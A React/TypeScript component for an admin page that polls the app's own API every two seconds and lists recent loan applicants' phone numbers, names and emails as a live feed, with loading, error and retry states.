import React, { useEffect, useState } from 'react';
import { ArrowLeft, Phone, Clock } from 'lucide-react';

interface AdminPageProps {
  onBackToApp: () => void;
}

interface ApplicationRecord {
  id: string;
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  submittedAt: string;
}

export const AdminPage: React.FC<AdminPageProps> = ({ onBackToApp }) => {
  const [applications, setApplications] = useState<ApplicationRecord[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [error, setError] = useState<string | null>(null);

  const fetchPhones = async () => {
    try {
      console.log('[AdminPage] Fetching applications from /api/applications?limit=20');
      console.log('[AdminPage] Current URL:', window.location.href);
      console.log('[AdminPage] Current pathname:', window.location.pathname);
      
      const res = await fetch('/api/applications?limit=20');
      console.log('[AdminPage] Fetch response status:', res.status, res.statusText);
      
      if (!res.ok) {
        const errorBody = await res.text();
        console.error('[AdminPage] API Error Response:', res.status, errorBody);
        throw new Error(`API Error: ${res.status} ${res.statusText}`);
      }
      
      const data = await res.json();
      console.log('[AdminPage] Successfully fetched applications:', data);
      setApplications(data.applications ?? []);
      setError(null);
    } catch (error: any) {
      const errorMsg = error?.message || String(error);
      console.error('[AdminPage] Fetch failed:', errorMsg);
      console.error('[AdminPage] Full error:', error);
      setError(errorMsg);
      setApplications([]);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    console.log('[AdminPage] Component mounted, starting to fetch phones');
    fetchPhones();
    const interval = setInterval(fetchPhones, 2000);
    return () => {
      console.log('[AdminPage] Component unmounting, clearing interval');
      clearInterval(interval);
    };
  }, []);

  return (
    <div className="min-h-screen bg-slate-100/90 flex flex-col items-center justify-start p-4 py-10">
      <div className="w-full max-w-5xl bg-white border border-slate-200 rounded-[28px] shadow-sm p-8">
        <div className="flex items-center justify-between gap-4 pb-6 border-b border-slate-200">
          <button
            type="button"
            onClick={onBackToApp}
            className="inline-flex items-center gap-2 text-sm font-semibold text-slate-600 hover:text-slate-900 transition-colors"
          >
            <ArrowLeft className="w-4 h-4" /> Back to Loan Application
          </button>
          <div className="inline-flex items-center gap-2 rounded-full bg-slate-50 px-4 py-2 text-slate-500 text-xs font-semibold uppercase tracking-[0.2em]">
            <Clock className="w-4 h-4" /> Real-time phone feed
          </div>
        </div>

        <div className="mt-6 grid gap-6">
          <div className="rounded-3xl border border-slate-200 bg-slate-50 p-6">
            <div className="flex items-center justify-between gap-4">
              <div>
                <p className="text-xs uppercase tracking-[0.28em] text-slate-500 font-semibold">Latest phone</p>
                <p className="mt-4 text-4xl font-extrabold text-slate-900">
                  {isLoading
                    ? 'Loading...'
                    : applications[0]?.phone || 'No phone entered yet'}
                </p>
              </div>
              <div className="inline-flex items-center gap-2 rounded-full bg-white px-4 py-2 text-sm font-semibold text-slate-700 shadow-sm">
                <Phone className="w-4 h-4 text-blue-600" />
                {applications.length} entries
              </div>
            </div>
          </div>

          <div className="rounded-3xl border border-slate-200 overflow-hidden">
            <div className="bg-slate-50 px-6 py-4 text-xs uppercase tracking-[0.24em] text-slate-500 font-semibold">
              Recent phone numbers
            </div>
            {isLoading ? (
              <div className="p-8 text-center text-slate-500">
                <p>Loading recent numbers...</p>
                {error && <p className="text-red-600 mt-2 text-xs">Error: {error}</p>}
              </div>
            ) : error ? (
              <div className="p-8 text-center text-red-600">
                <p>Failed to load applications</p>
                <p className="text-xs mt-2">{error}</p>
                <button
                  onClick={() => {
                    setError(null);
                    setIsLoading(true);
                    fetchPhones();
                  }}
                  className="mt-4 px-4 py-2 bg-blue-600 text-white rounded text-xs hover:bg-blue-700"
                >
                  Retry
                </button>
              </div>
            ) : applications.length === 0 ? (
              <div className="p-8 text-center text-slate-500">No phone numbers submitted yet.</div>
            ) : (
              <div className="divide-y divide-slate-200">
                {applications.map((app) => (
                  <div key={app.id} className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 px-6 py-4 hover:bg-slate-50 transition-colors">
                    <div className="min-w-0">
                      <p className="text-sm font-semibold text-slate-900 truncate">{app.phone}</p>
                      <p className="text-xs text-slate-500 truncate">
                        {app.firstName} {app.lastName} • {app.email}
                      </p>
                    </div>
                    <p className="text-xs text-slate-400 uppercase tracking-[0.18em]">
                      {new Date(app.submittedAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                    </p>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
